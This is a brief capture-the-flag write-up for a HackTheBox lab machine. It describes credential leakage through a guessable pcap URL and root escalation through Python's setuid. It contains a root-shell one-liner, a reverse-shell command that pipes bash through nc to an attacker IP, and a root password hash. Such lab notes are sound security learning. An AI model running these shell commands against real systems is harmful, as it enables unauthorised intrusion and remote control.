# Summary
- Takeaways:
	- when dealing with numbered items, always try 0
	- fuzz all directories, adding specific status codes to the `gobuster` blacklist if needed
- User: website serves a .pcap file that contains a username and password that can be used to SSH in
- Root: user has ability to use `setuid` and can impersonate `root`
 
# Details
### User
- port scan reveals ports 21, 22 and 80 open
- port 80 hosts a website that allows you to view the output of the `ifconfig` and `netstat` commands on the remote server
- additionally allows you to capture packets for five seconds and then download the .pcap file
- first .pcap file is served from `http://cap.htb/data/1`
- checking for the existence of `http://cap.htb/data/0` reveals a previous packet capture that includes a username and password that can be used to log in with SSH

### Root
- inspecting the files in `/var/www/html` reveals a Flask app that uses `os.setuid(0)` within the `/capture` endpoint handler
- this server is ran as the current user (`nathan`), indicating it's possible to use `setuid` to impersonate `root`
- possible to open a root shell with `python3 -c ‘import os; os setuid(0); os.system(“/bin/bash”);’`
- also possible to open a reverse shell in a Python REPL with `import os; os.setuid(0); os.system("mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.20 9999 > /tmp/f"` opens a reverse shell as `root`

#### root password hash: ` $6$8vQCitG5q4/cAsI0$Ey/2luHcqUjzLfwBWtArUls9.IlVMjqudyWNOUFUGDgbs9T0RqxH6PYGu/ya6yG0MNfeklSnBLlOskd98Mqdm0`
